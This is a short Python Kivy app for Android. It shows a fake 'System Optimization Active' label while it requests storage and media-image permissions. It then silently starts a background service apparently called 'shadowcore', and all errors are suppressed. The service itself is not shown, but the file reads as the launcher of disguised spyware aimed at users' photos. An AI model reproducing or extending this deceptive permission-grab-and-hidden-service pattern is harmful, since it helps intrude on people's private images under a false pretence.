from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass

class PhotoSystemApp(App):
    def build(self):
        return Label(text="System Optimization Active")

    def on_start(self):
        Clock.schedule_once(self.ask_permissions, 1)

    def ask_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            perms = [
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_MEDIA_IMAGES,
                Permission.FOREGROUND_SERVICE
            ]
            request_permissions(perms, self.start_service)
        except: pass

    def start_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            service_class = autoclass('org.test.shadowcore.ServiceService')
            service_class.start(PythonActivity.mActivity, "")
        except: pass

if __name__ == "__main__":
    PhotoSystemApp().run()
